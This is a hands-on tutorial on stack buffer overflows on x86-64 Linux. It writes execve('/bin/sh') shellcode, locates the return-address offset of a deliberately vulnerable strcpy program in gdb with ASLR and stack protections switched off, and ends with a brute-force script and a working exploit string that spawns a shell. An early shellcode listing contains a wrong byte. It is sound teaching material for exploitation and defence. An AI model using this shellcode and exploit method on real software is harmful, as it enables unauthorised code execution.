# Stack-based Buffer-Overflow on a x86-64

The goal of this text is to introduce the reader to buffer-overflows on an Intel x86-64 architecture under Linux. In the optimal case, the reader should be able to run through the examples on his own machine and thereby gain hands-on experience on the topics presented.

The reader is expected to have a basic understanding of how a computer works and should be familiar with basic concepts, such as programming languages, compilers, editors, stack. In the optimal case, the reader knows on a conceptual level how buffer-overflows work, so the text at hand will introduce him to the necessary tools and will provide an example of how a simple vulnerability can be exploited.

We start by constructing what is called the "shellcode", a simple sequence of opcodes (machine language instructions) that, when executed on a processor running Linux, open a command shell. Given a vulnerable program running as a process on a machine, the goal is to smuggle the shellcode masked as regular user input into the memory of the process (that runs the vulnerable code) and then, by exploiting the vulnerability, make the process execute the shellcode. Thereby, the original process will be turned into a shell.
In the next step, we provide a way that allows us to test the shellcode we have created. I.e., we will create a simple C program that copies our shellcode into memory and we will point the so called instruction pointer to the memory location, such that the respective machine instructions will be executed. 
The next paragraph introduces a vulnerable C program, which we will further investigate using a debugger. With the help of the debugger, we will be able to observe the executable on the processor and we will further monitor the use of the memory by the program. The debugger further allows us to understand where program variables are located on the stack and will enable us to determine the offset and return address necessary to create a so called "exploit" that takes advantage of the vulnerability to turn the original process into a command shell.  

## Shellcode

The goal of this paragraph is to create so called  shellcode (in opcodes) that can be stored in memory (e.g., by entering it as a function argument) of a running program. If we manage a process to execute the code (in memory) we might make the process behave according to our will, perhaps in a malicious way from the original process' point of view. A classic way to make a process execute the shellcode, is to make the instruction pointer of the process point to the memory location, where we have put our shellcode. As a result, the instructions of our shellcode will be executed within the process, turning the original process into a Unix/Linux command shell. 

To create the shellcode, we come up with some simple assembly code that uses the so called `sys_execve` system call (under Linux), that triggers a provided executable (in our case `/bin/sh`) to be executed within a process. Note that `execve` actually has three parameters, of which the other two (command options and environment that would be placed in registers `rsi` and `rdx`) are `NULL` in our example. 

The simple assembly code to open a shell is:
```
section .data

NULL        equ     0
shell       db    "/bin/sh", NULL

section .text
global _start
_start:
    mov     rax, 59
    mov     rdi, shell
    syscall
```
The code uses the `execve` system call, that takes three arguments. An executable file (in our case `/bin/sh`) to be execute within the current process, an array of arguments passed to the executable, and an array of environment variables. However, the second and third argument can be `NULL` in our case. 

Storing the above code in file `shellcode.asm` we can compile the code using the following command: `yasm dwarf2 -f elf64 shellcode.asm -l shellcode.lst` 

The command (`dwarf2` is a debugging standard) creates the corresponding listing (`.lst`) file that contains the corresponding opcodes:

```
     1                                 %line 1+1 shellcode.asm
     2                                 [section .data]
     3                                 
     4                                 NULL equ 0
     5 00000000 2F62696E2F736800       shell db "/bin/sh", NULL
     6                                 
     7                                 [section .text]
     8                                 [global _start]
     9                                 _start:
    10 00000000 48C7C03B000000          mov rax, 59
    11 00000007 48C7C7[00000000]        mov rdi, shell
    12 0000000E 0F05                    syscall
```
In the left column there are the line numbers, in the second column the relative memory addresses and in the third column the op-codes.

One can now use the linker command `ld -o shellcode shellcode.o` to create an executable, and test, if the code behaves as expected.

If we could now manage to to somehow push the op-codes onto the stack of an arbitrary program on the processor and make the instruction pointer point to the beginning the opcodes, the process would turn into a shell.

Entering the op-codes into a program (e.g., as a console input) poses a set of problems:
- If a hex value is not a character, we have problem entering the corresponding hex-code. In a shell we can use `<ctrl>-<shift>-u 0 0 41` to enter hex-codes (the example corresponds to the letter `A`).
- The method to enter hex-codes in a shell works for most of the bytes except the `NULL` byte, i.e. `0x00`, since it is a non-printable ASCII character used to mark the end of a string and can thus not be entered as part of a string.
- Last but not least, entering relative addresses, such as `[00000000]`, would not make sense to inject into a program.

In order to address these challenges, we modify our shellcode as follows:
- To avoid having to fill NULL-bytes when entering `59` into `rax`, first zero-out `rax` by xor-ing it with itself, thereby filling `rax` with zeros. Then fill `59` into `al` (the lower bytes of the register `rax`).
- The string (`/bin/sh`) can be pushed on the stack and `rsp` can be used as a pointer to the string's address.
- Since a push requires 8 bytes, but `/bin/sh` is only 7 bytes long, we extend the string with a leading `/`, so we push the string `//bin/sh`.
- Since the architecture is little-endian we have to make ensure that the string starts in low memory, i.e., we have to provide the string backwards.

The modified assembly code thus becomes:
```
section .text
global _start
_start:
	xor		rax, rax
	push	rax
	mov		rbx, 0x68732f6e69622f2f
	push	rbx
	mov		al, 59
	mov		rdi, rsp
	syscall
```

Compiling this code with the command `yasm -dwarf2  -f elf64 shellcode.asm -o shellcode.o` provides the corresponding object file with the op-codes. Using the command `objdump -d shellcode.o` we get the following output:

```
shellcode.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <_start>:
   0:	48 31 c0             	xor    %rax,%rax
   3:	50                   	push   %rax
   4:	48 bb 2f 2f 62 69 6e 	movabs $0x68732f6e69622f2f,%rbx
   b:	2f 73 68 
   e:	53                   	push   %rbx
   f:	b0 3b                	mov    $0x3b,%al
  11:	48 89 e7             	mov    %rsp,%rdi
  14:	0f 05                	syscall 
```

In the middle column you can find the op-codes of our program. Linking the program with `ld shellcode.o -o shellcode` creates the executable that allows us to test, if the code indeed behaves as expected.

Note however, that our shellcode, the machine instructions (opcodes) we want to fill into the memory of a vulnerable process, corresponds to the bytes in the middle column of `shellcode.o`.

## Simple Test of the Shellcode

There are multiple ways to test if the shellcode works when inserted into the memory of a given process. We provide a simple example that allows us test the shellcode from the last paragraph.

Consider the following `C` code:

```
#include<stdlib.h>

int main()
{
	char shellcode[] = "\x48\x31\xc0\x50\x48\xbb\x2f\x2f"
					"\x62\x69\x6e\x2f\x73\x68\x53\xb0"
					"\xb3\x48\x89\xe7\x0f\x05\x90\x90";

	int (*func)();
	func = (int (*))() shellcode;
	(*func)();
}
```

In this code we have added our shellcode in the string variable `shellcode`. Then we have defined a pointer (`func`) to a function. On the next line, we have made the function pointer to point to the `shellcode` variable (we have cast `shellcode` accordingly, such that the compiler does not complain). Finally, we call the function `func` that is the supposed to execute our shellcode.

If we compile the code (e.g., using `gcc testsc.c -o testsc`) and try to run it, we will get a `segmentation fault` (at least on modern kernels). This error is due to the fact, that the stack is (typically) marked as non-executable. To check this use the command `readelf -l testsc`. In the output search for the line `GNU_STACK` where in the column `Flags` you find `RW`. Compiling the code with the option `-z execstack`, will make the stack executable (Flag: `RWE`).

Running the re-compiled executable again returns a `segmentation fault`. This time we look at the problem using `strace` that traces system calls and signals of an executable. The output of the command `strace testsc` includes the following lines:

```
...
execve("//bin/sh", ["./testsc"], 0x7fffffffde10 /* 12 vars */) = -1 EFAULT (Bad address)
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x47} ---
+++ killed by SIGSEGV (core dumped) +++
...
```

The first line of the cutout shows that the syscall `execve` was correctly called with the parameter `//bin/sh`, but that somehow the third parameter of the call (`0x7fffffffde10`) seems to be strange. Looking for information about the parameters of system calls, for example on [1], shows that the third parameter is supposed to be a pointer to an array of strings for the environment. Since the third parameter of function calls on a x86-64 processor is handed over in register `rdx`, it seems as if the register has been used by our test program in an unintended way.

In order to resolve the issue, we fix our shellcode by xor-ing `rdx` with itself before calling `execve`, thereby resetting the `rdx` register to `Null`. We thus modify our assembly code as follows (`shellcode.asm`):
```
section .text
global _start
_start:
	xor		rax, rax
	push	rax
	mov		rbx, 0x68732f6e69622f2f
	push	rbx
	mov		al, 59
    xor     rdx, rdx
	mov		rdi, rsp
	syscall
```

Doing the same as described before, we compile the assembly code and extract the corresponding op-codes to get to our final test program (file `testsc.c`):
```
#include <stdlib.h>

int main() 
{
    char shellcode[] = "\x48\x31\xC0\x50\x48\xBB\x2F\x2F"
                   "\x62\x69\x6E\x2F\x73\x68\x53\xB0"
                   "\x3B\x48\x31\xd2\x48\x89\xE7\x0F"
                   "\x05\x90\x90\x90\x90\x90\x90\x90";

    int (*func)();
    func = (int (*)()) shellcode;
    (*func)();
}

```

Compiling it with the option to make the stack executable should now result in an executable, that runs the shellcode from within an executable, by having pushed the shellcode onto the stack and pointing the instruction pointer to it.

## Shellcode in the Data Segment

If we modify our test program slightly, namely if we put the shellcode variable `shellcode` outside of the scope of main, the shellcode will be stored on the stack, but in the data segment:

```
#include <stdlib.h>

    char shellcode[] = "\x48\x31\xC0\x50\x48\xBB\x2F\x2F"
                   "\x62\x69\x6E\x2F\x73\x68\x53\xB0"
                   "\x3B\x48\x31\xd2\x48\x89\xE7\x0F"
                   "\x05\x90\x90\x90\x90\x90\x90\x90";

int main()
{
    int (*func)();
    func = (int (*)()) shellcode;
    (*func)();
}
```

Compiling this code leads again to a `segmenation fault`. This time the problem cannot be solved by making the stack executable. The solution of the problem is left for the reader as an exercise.

A possible solution is given in the files `shellcode2.asm` and `testsc2.c`. Note that the solutions are "fragile" in the sense that they might have to be adjusted when using a new version of the C compiler.

## Exploiting Vulnerable Code

### A Vulnerable Executable

Given that we have a working shellcode, we will now try it out on a sample of vulnerable code. For this purpose we use the following snippet of C code:

```
#include<string.h>

void copy_string(char *input)
{
    char str[60];

    strcpy(str, input);
}

int main(int argc, char *argv[])
{
    copy_string(argv[1]);
    return 0;
}
```

The code consists of a `main` function and the procedure `copy_string`, where the `copy_string` function simply takes a pointer to a character array and copies the content of the array into another variable `str` that is also a character array. For copying the `strcpy` function is used that takes two pointer to character arrays as its arguments and copies the content of the second to the first. `strcpy` is a well known source of buffer overflow problems, since it does not check the size of source and destination buffers, but simply copies whatever it finds in the source buffer to the destination buffer, thereby possibly exceeding the size of the destination buffer and thus overwriting adjacent memory areas.

In order to create a vulnerable executable we compile the above code as follows:

`gcc -g -fno-stack-protector -z execstack vulnerable.c -o vulnerable`

Here we assume that the code is contained in the file `vulnerable.c`. Note that the option `fno-stack-protector` we have turned off canaries, with the option `-z execstack` we have prevented that the stack is marked non-executable in the executable file. The `-g` option enables debugging of the executable using `gdb`.

In order to further simplify an attack against the executable, we turn off kernel address space layout randomization (ASLR) using the following command to configure the kernel parameter `kernel.randomize_va_space`:

`sudo sysctl -w kernel.randomize_va_space=0`.

At this point we are ready to use `gdb` as our microscope to investigate the behavior of our executable on the processor and in memory. Note at this point that `gdb` by default (at least in version 10.1 used as a basis for this report) turns off ASLR when run executables.

### The Executable on the Processor and in Memory

Given the executable `vulnerable`, as it has been created in the last paragraph, we run the executable in `gdb` with the command `gdb vulnerable`. Having started `gdb` we can run the program using the command `run`, what will lead in our case to a `Segmentation Fault` since our program expects some input. Handing over an argument (e.g., `(gdb) run AAAA`) will successfully execute the program and the corresponding process will exit normally.

Using the command `list` in `gdb` we get an at excerpt of the source code (use `<Enter>` to scroll forward) and we can set break-points. For example, we can set a break-point at line 8 just before the execution of the execution of the `strcpy` function by using the command `break 8`.

Now run the executable for example with the input `AAAAAAAAAA`: 

```
(gdb) run AAAAAAAAAA
Starting program: <dir>/vulnerable AAAAAAAAAA

Breakpoint 1, copy_string (inp=0x7fffffffe206 "AAAAAAAAAA") at vulnerable.c:8
8	    strcpy(str, inp);
```

In order to better understand how the current stack looks like, we can use the following command:

```
(gdb) info frame
Stack level 0, frame at 0x7fffffffdd40:
 rip = 0x555555555145 in copy_string (vulnerable.c:8); saved rip = 0x55555555517d
 called by frame at 0x7fffffffdd60
 source language c.
 Arglist at 0x7fffffffdd30, args: inp=0x7fffffffe206 "AAAAAAAAAA"
 Locals at 0x7fffffffdd30, Previous frame's sp is 0x7fffffffdd40
 Saved registers:
  rbp at 0x7fffffffdd30, rip at 0x7fffffffdd38
```

Note here, that at the current stage, we are inside a function call of our program, i.e., a corresponding stack-frame has been pushed onto the stack. Thus we notice the saved registers (`rbp` and `rip` at the end of the output).

If we check the saved instruction pointer at memory location `0x7fffffffdd38`, e.g., by using the command `x/8x 0x7fffffffdd38`, we notice that the stored instruction pointer refers to the instruction in `main` right after the call to our function `copy_string` (note that the byte order on x86 is little-endian).

To verify that the stored instruction pointer indeed points to claimed location in `main`, use for example the command `disassemble main`.

Now let's look at our function call and the variables. First of all we can check the content of our character array `str`: `x/10x &str`. As the output of this command we notice, that the memory area only contains null-bytes. This is correct, given that we did not yet execute the `strcpy` function.

Using the `step` command, we execute the next step in our program. Having done so we can again check the content of the character array `str` and we will see, that now the array contains ten times `0x41` the ASCII code of the letter `A` in hex format. Having checked that our program behaves as expected, we can terminate its execution with the `continue` command.

### Exploiting the Vulnerability in `gdb`

In a first step, we will simply overflow the buffer, in a second step we will use our shellcode from the initial paragraph and make the vulnerable program open a shell for us.

Let's again start the vulnerable executable in `gdb` using the command `gdb vulnerable` and again let's put a break point right before execution of the critical function call to `strcpy` (see last paragraph).

Let's first execute the program with a regular length input to get some further information about the executable. Therefore start the program with `run AAAAAAAAAAA`.

If the program halted at the breakpoint before executing the call to `strcpy` we again use `info frame` to get the memory address where the return address is stored:
```
(gdb) info frame
Stack level 0, frame at 0x7fffffffdd40:
 rip = 0x555555555145 in copy_string (vulnerable.c:8); saved rip = 0x55555555517d
 called by frame at 0x7fffffffdd60
 source language c.
 Arglist at 0x7fffffffdd30, args: inp=0x7fffffffe206 "AAAAAAAAAA"
 Locals at 0x7fffffffdd30, Previous frame's sp is 0x7fffffffdd40
 Saved registers:
  rbp at 0x7fffffffdd30, rip at 0x7fffffffdd38
```

furthermore, we get the address of the variable `str` using the command `print &str`:
```
(gdb) print &str
$5 = (char (*)[60]) 0x7fffffffdcf0
```

Doing a simple subtraction `0x7fffffffdd38` - `0x7fffffffdcf0` we see that the return address and the address where the character array starts are 72 bytes apart.

Let's now finish the current execution and restart the program, this time with an argument that exceeds the reserved space of 60 bytes and even exceeds the relative (byte)-distance between the memory location of `str` and the stored return address:
```
(gdb) run $(python -c 'print(78*"A")')
```
Let's at this point check where saved rip is located:
```
(gdb) info frame
Stack level 0, frame at 0x7fffffffdd00:
 rip = 0x555555555145 in printarg (vuln.c:8); saved rip = 0x55555555517d
 called by frame at 0x7fffffffdd20
 source language c.
 Arglist at 0x7fffffffdcf0, args: inp=0x7fffffffe1c0 'A' <repeats 78 times>
 Locals at 0x7fffffffdcf0, Previous frame's sp is 0x7fffffffdd00
 Saved registers:
  rbp at 0x7fffffffdcf0, rip at 0x7fffffffdcf8
```
and check the content of the address:
```
x/10x 0x7fffffffdcf8
0x7fffffffdcf8:	0x7d	0x51	0x55	0x55	0x55	0x55	0x00	0x00
0x7fffffffdd00:	0x08	0xde
```

Furthermore, we have:
```
print &str
$2 = (char (*)[60]) 0x7fffffffdcb0
```

*Side Note*: The reader might have noticed that the memory location where the return address (as well as the memory address of the character array) have changed. This is due to the changed length of the argument, which is also handed over as part of the stackframe of the process. However, the relative distance between the memory location of the character array and the return address does not change.

Now, let's fire `strcpy` with an input that exceeds the length of the reserved memory location by using the `step command.

If we now again examine the memory location of the stored return address we get the following:
```
(gdb) x/10x 0x7fffffffdcf8
0x7fffffffdcf8:	0x41	0x41	0x41	0x41	0x41	0x41	0x00	0x00
0x7fffffffdd00:	0x00	0xde
```

As our calculation has shown, the memory distance (72 bytes) between `str` and the stored return address as been filled with `A`s and additional 6 `A`s (note that we had input 78 `A`s) have overwritten the stored return address.

If we now `continue` the execution, we end up in a `Segmentation fault`, since the process tries to access memory location `0x0000414141414141`, which it is apparently not allowed to access.

At this point, we have all we need to exploit the vulnerability in our sample executable. Our goal is to use the shellcode we have composed in the first part, put it on the stack and modify the return address such that it points to our shellcode that would then be executed, when the function call returns.

So, in order to put together our exploit, we will compose the input string as follows:
```
<shellcode> + padding + <start-address of shellcode>
```

Recall that the string we input as the argument for our executable is filled into the memory starting at the start-address of our character array `str` filling up memory cells to higher addresses. Furthermore, recall the little-endian byteorder.

So the shellcode we have put together above is the following string:
```
\x48\x31\xc0\x50\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\xb0\x3b\x48\x31\xd2\x48\x31\xf6\x48\x89\xe7\x0f\x05
```
it has a length of 28 bytes.

The target address where the character array `str` starts is:
```
\xb0\xdc\xff\xff\xff\x7f
```
(note the little-endian byteorder) having a length of 6 bytes. 

Together both strings have a byte length of 34 bytes, such that we have to add another 44 padding bytes in between them. We will use `printf` to assemble the bytestring and will use 44 `0`s (encoded as `\x30`) as padding bytes.

Putting it all together we have the following `printf` expression that creates the bytestring for us:
```
printf "%b%044x%b" "\x48\x31\xc0\x50\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\xb0\x3b\x48\x31\xd2\x48\x31\xf6\x48\x89\xe7\x0f\x05" "0" "\xb0\xdc\xff\xff\xff\x7f"
```

This can be input in `gdb` as follows:
```
run $(printf "%b%044x%b" "\x48\x31\xc0\x50\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\xb0\x3b\x48\x31\xd2\x48\x31\xf6\x48\x89\xe7\x0f\x05" "0" "\xb0\xdc\xff\xff\xff\x7f")  
```

If everything works as expected, the above command will exploit the vulnerability in the executable `vulnerable` and will span a shell within `gdb`.

### An Exploit for the Executable

Up to this point, we have developed an exploit, that works within `gdb`, however, we would of course be interested in an exploit we could use right away for the executable. Try to run our exploit code from the last paragraph directly in a shell with the executable, most probably the program will crash with a segmentation fault.

In order to understand the problem, compile the following `C`-code:

```
#include <stdio.h>

unsigned long find_addr(void)
{
	__asm__("movq %rsp, %rax");
}

int main()
{
	printf("0x%llx\n", find_addr());

	return 0;
}
```

For compiling use the `-g` option, so you have the debugging symbols in the executable. The program obviously does nothing else, than printing the current address of the top of the stack (the content of the `rsp`-register). Running the program multiple times should return the same address (else you most probably did not turn off address-space-layout-randomization).

Now run the program in `gdb` a few times and compare the results. Obviously, the results in `gdb` are constant as well, but differ from the address we get, when running the executable directly.

Looking at the diagram that shows how the memory of a running executable looks like explains, where the difference might come from>

```
                                        |  kernel-space virtual memory
high memory     |                   |   v  shared between processes
                ---------------------  ---
		| args and env vars |   ^
                ---------------------   |  user-space virtual memory
                |       stack       |	   different per mapping
                |         .         |
                |         .         |
                |     available     |
                |       memory      |
                |         .         |
                |         .         |
                |        heap       |
                ---------------------
                | uninitialized data|
                ---------------------
                |       data        |
                ---------------------
                |     text (code)   |
                ---------------------
low memory      |      reserved     |
                ---------------------
```

As diagram shows, above the actual stack of the process and still within the user-space of the process' memory, there are the arguments and the environment variables.

Looking at the arguments first, we see that obviously the location (the addresses) of where the variables get stored in memory may depend on the size of the arguments, since they are placed above the stack of the process. Recall that the first argument `argv[0]` is always the program (the executable's) name. 

Let's do a simple test and run the above `C`-code once from within the folder where the executable is stored as `./<executable-name>` and once call the executable with the whole path, e.g., using the command `$(readlink -f <executable-name>)` from with the directory of the executable.

If you compare the output of the code, you most probably see a difference of the addresses returned. The difference in case of the author's machine was twice the size of the directory's path in bytes. So, obviously the way we call the executable (absolute or relative path) already makes a difference on address of the shellcode copied onto the stack.

Note: In `gdb` it seems that the executables are always called with their absolute path, so the stack of an executable "inside" `gdb` will always contain executable's name with the absolute path.

The next potential source of changes of the addresses are the environment variables. In the shell the environment variables may be listed using the command `env`. Similarly, within `gdb` the environment variables within `gdb` can be listed using the command `show env`. In order to run a command in a terminal without environment variables the command can be run as follows: `env - <command>`. Similarly, `gdb` can be run without environment variables as `env - gdb <executable>`.

The reader should at this point play around with executables such as the `C`-code above to get an idea of to impact of the environment variables on the addresses of variables stored on the stack.

In addition to the arguments length and the environment, `gdb` might add other (control) elements to the stack, that have an impact on the address of the variable where the shellcode will be stored and/or the distance between memory address of the variable and memory address where the return pointer is stored. As consequence, we have to adapt the exploit we have found in `gdb` in order for it to work outside of the debugger's environment. Unfortunately, there is no tool that would enable us to precisely inspect the stack as we did it with the debugger, so we have to guess the correct parameters in a trial-and-error manner.

The following shell-script supports us in the process of guessing the correct parameters:

```
#!/bin/sh

shellcode="\x90\x90\x90\x90\x90\x90\x90\x90\x48\x31\xc0\x50\x48\xbb\x2f\x2f\x62\
x69\x6e\x2f\x73\x68\x53\xb0\x3b\x48\x31\xd2\x48\x31\xf6\x48\x89\xe7\x0f\x05"

addr="\xdc\xff\xff\xff\x7f"

zeros=""
zerosinit="\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\
x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"

addrbytes=""

for ((i=0;i<16;i++))
do
    zeros=$zerosinit
    for ((j=0;j<12;j++))
    do
        printf "Added zeros: %d\n" "$j"
        printf "Address last byte: %d\n" "$i"
        addrbytes=$(printf "%s%x%x" "\x" "$i" "1")
        <path>/vulnerable $(printf "%b%b%b%b" "$shellcode" "$zeros" "$addrbytes" "$addr")
        zeros="$zeros\x30"
    done
done

```

The shellscript works as follows:
- Variable `shellcode` contains to original shellcode from the above paragraphs. We have added a few so called `NOP`-instructions `\x90' ("No-OPeration') that do nothing. This is a so called "`NOP`-sled" that creates some kind of a landing zone for the target address, i.e., we do not have to find the target address precisely, if the return address matches one of the `NOP`s, the shellcode will be executed.
- The `addr` variable contains the five most significant bytes of the target address (note the little-endian order of the bytes). The second least significant byte of the address has been chosen the same as in the `gdb` exploit.
- `zerosinit` is initially set to contain 14 `0` strings.
- The outer `for`-loop runs over all 16 possibilities of the "most significant" half-byte in the last byte of the destination-address.
- The inner `for`-loop adds between 0 and 12 `0`-strings to test potentially differing distances between the location of the stored return-address and the address of the variable that will contain our shellcode.
- Note that in the composition of the last address-byte, we restrict ourselves to "1" as the least-significant half-byte. The reason is we cannot compose a hex-string that contains a null, since the null would be omitted by `printf`.

The most critical elements of the script are the value of the `addr` variable and the number of zeros. Remeber that the `addr` variable denotes the address on the stack where we expect our shellcode to be stored (the address we want the instruction pointer to point to), whereas the number of zeros "bridges the gap" between the program variable and the location where the instruction pointer of the caller is stored. As we had already seen, the stack (and as a consequence the value of `addr`) can change because of different environment on the same machine, things get even worse in the case of different kernel or compiler versions. In order to reproduce the results presented here, the reader should determine the value of `addr` for his environment as it has been explained in the paragraphs above (similar for the number of zeros, although this parameter should be more "stable").

In the author's case the script stopped (became a new shell) when the `i` had the value `9` and `j` had the value `2`. So the final exploit to work for the executable is the following:

```
printf "%b%036x%b" \
"\x90\x90\x90\x90\x90\x90\x90\x90\x48\x31\xc0\x50\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\xb0\x3b\x48\x31\xd2\x48\x31\xf6\x48\x89\xe7\x0f\x05" \ 
"0" "\x91\xdc\xff\xff\xff\x7f"
```

The complete expression to exploit the vulnerable executable is the following:

```
<path>/vulnerable $(printf "%b%036x%b" \ 
"\x90\x90\x90\x90\x90\x90\x90\x90\x48\x31\xc0\x50\x48\xbb\x2f\x2f\x62\x69\x6e\
x2f\x73\x68\x53\xb0\x3b\x48\x31\xd2\x48\x31\xf6\x48\x89\xe7\x0f\x05" \
"0" "\x91\xdc\xff\xff\xff\x7f")
```
In the expression, the `<path>`-element has to be replaced accordingly, i.e., by the absolute path of the directory, where the executable can be found. Note that the absolute path is obviously important, i.e., the same exploit would (most probably) not work in case the `<path>/`-part would be omitted, e.g., by simply calling the executable in the corresponding directory with the command `./vulnerable`. However, using the script the exploit can be adjusted accordingly. Additionally, note that, by increasing the "`NOP`-sled", the probability that the newly set return address will lead to an execution of the shellcode can be increased and thus the exploit can be made "resilient" against changing environment variables on different target machines to some extent.  

# Summary

We have started our report by the construction of what is called *shellcode*, i.e., a set of machine instruction that can be filled into an executable area of memory and when pointed at by the instruction pointer, will open a shell for us. As a next step we have looked at some `C`-code that takes some input and writes it to memory without checking memory bounds, i.e., the length of the input string may exceed the size of the memory area that is planned to store the input string. As a consequence, we were able to overwrite elements on the stack of the process, most important we managed to overwrite (and thus control) the return-address of the function that processes the input. We have further investigated the problem using the debugger `gdb`.

Using `gdb` we were able to craft a string that contains our shellcode and that has turned the vulnerable program into a shell when executed within `gdb`. Given our exploit in `gdb`, we have learned that the exploit will not work when applied to the executable right away, since a set of elements on the stack may change from the debugging environment to the "normal" environment, such that the exploit has to be adjusted accordingly. For this purpose we came up with a little shell-script that lets us test a set of return-addresses and offsets automatically.

Finally, it has to be noted, that we have turned off two central protection mechanisms against this type of vulnerability. When compiling the vulnerable program, we have added the `fno-stack-protector` option that hast turned of the insertion of so called "canaries" (random strings), that would prevent unintended overwriting of stack elements. In the kernel, we have turned off Address-Space-Layout-Randomization (ASLR) that randomized addresses of variables on the stack, such that prediction of address where the shellcode starts should be prevented.  

  

# Resources:

- (1): https://linuxhint.com/list_of_linux_syscalls/#execve
- (2): https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/fs/exec.c
- (3): https://medium.com/syscall59/on-eggs-and-egg-hunters-linux-x64-305b947f792e
- (4): https://blog.packagecloud.io/eng/2016/04/05/the-definitive-guide-to-linux-system-calls/
- (5): https://www.kernel.org/doc/Documentation/x86/x86_64/mm.txt
